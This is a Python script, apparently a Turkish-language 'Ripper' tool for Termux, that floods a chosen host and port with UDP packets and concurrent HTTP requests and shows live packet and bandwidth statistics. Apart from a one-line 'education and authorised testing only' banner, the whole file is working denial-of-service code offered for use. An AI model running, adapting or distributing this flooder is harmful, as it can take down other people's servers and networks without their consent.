import sys
import socket
import threading
import random
import time
import asyncio
import os

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP_ENABLED = True
except ImportError:
    UVLOOP_ENABLED = False

import aiohttp

# ===================== BANNER =====================
os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════════════════╗")
print("║                    LINUXSQUAD RIPPER v8 - TERMUX FIXED v4                   ║")
print("║                   +                                                         ║")
print("╚══════════════════════════════════════════════════════════════════════════════╝")
print("\033[0m")

print("\033[91m[!] SADECE EĞİTİM VE İZİNLİ TEST ORTAMINDA KULLANINIZ.\033[0m\n")

# ===================== ARGÜMAN KONTROLÜ =====================
if len(sys.argv) < 3:
    print("\033[96mKullanım:\033[0m")
    print(f"   python {os.path.basename(sys.argv[0])} <HEDEF> <PORT> [CONCURRENCY] [METHOD]")
    print("   Örnek : python ripper.py 127.0.0.1 80 300 mixed")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 300
method = sys.argv[4].lower() if len(sys.argv) > 4 else "mixed"

DURATION = 60   # Her seferinde 60 saniye

# ===================== İSTATİSTİK =====================
stats = {"udp_packets": 0, "udp_bytes": 0, "http_requests": 0, "errors": 0, "start_time": time.time()}
stats_lock = threading.Lock()

def update_stats(udp_pkt=0, udp_bytes=0, http_req=0, err=0):
    with stats_lock:
        stats["udp_packets"] += udp_pkt
        stats["udp_bytes"] += udp_bytes
        stats["http_requests"] += http_req
        stats["errors"] += err

def print_stats():
    while True:
        time.sleep(1.5)
        elapsed = time.time() - stats["start_time"]
        if elapsed < 1: continue
        pps = stats["udp_packets"] / elapsed
        mbps = (stats["udp_bytes"] * 8) / (elapsed * 1_000_000)
        rps = stats["http_requests"] / elapsed
        print(f"\033[94m[STATS] UDP PPS: {pps:,.0f} | Bandwidth: {mbps:.2f} Mbps | "
              f"HTTP RPS: {rps:,.0f} | Errors: {stats['errors']}\033[0m", end="\r")

# ===================== UDP FLOOD =====================
def udp_flood_worker():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
    except:
        return
    while True:
        try:
            tport = port if random.random() > 0.2 else random.randint(1, 65535)
            size = random.randint(8192, 32768)
            payload = random.randbytes(size)
            sock.sendto(payload, (target, tport))
            update_stats(udp_pkt=1, udp_bytes=size)
        except:
            update_stats(err=1)

# ===================== HTTP FLOOD =====================
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]
REFERERS = ["https://www.google.com/"]
PATHS = ["/", "/index", "/home", "/search"]

async def http_flood_worker(session):
    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS), "Referer": random.choice(REFERERS)}
            path = random.choice(PATHS) + f"?t={int(time.time()*1000000)}"
            url = f"http://{target}:{port}{path}" if port not in (80, 443) else f"http://{target}{path}"

            async with session.get(url, headers=headers, timeout=6) as response:
                await response.read()
            update_stats(http_req=1)
        except:
            update_stats(err=1)

# ===================== ANA PROGRAM =====================
print(f"\033[91m[+] Hedef → {target}:{port} | Concurrency → {concurrency} | Method → {method.upper()} | Süre → {DURATION} sn\033[0m")

if UVLOOP_ENABLED:
    print("\033[92m[+] uvloop aktif\033[0m")

threading.Thread(target=print_stats, daemon=True).start()

# UDP
if method in ["udp", "mixed"]:
    udp_count = int(concurrency * 0.75) if method == "mixed" else concurrency
    print(f"\033[92m[+] {udp_count} UDP Worker başlatılıyor...\033[0m")
    for _ in range(udp_count):
        threading.Thread(target=udp_flood_worker, daemon=True).start()

# HTTP
if method in ["http", "mixed"]:
    http_count = int(concurrency * 0.25) if method == "mixed" else max(40, concurrency//3)
    print(f"\033[92m[+] {http_count} HTTP Worker başlatılıyor...\033[0m")

    async def run_http():
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0)
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = [asyncio.create_task(http_flood_worker(session)) for _ in range(http_count)]
            await asyncio.gather(*tasks, return_exceptions=True)

    asyncio.run(run_http())

print(f"\033[93m[+] {DURATION} saniye boyunca saldırı devam ediyor...\033[0m")
time.sleep(DURATION)

print("\n\033[91m[-] Süre doldu, saldırı durduruldu.\033[0m")
elapsed = time.time() - stats["start_time"]
print(f"\033[92m[+] Toplam süre: {elapsed:.1f} saniye\033[0m")
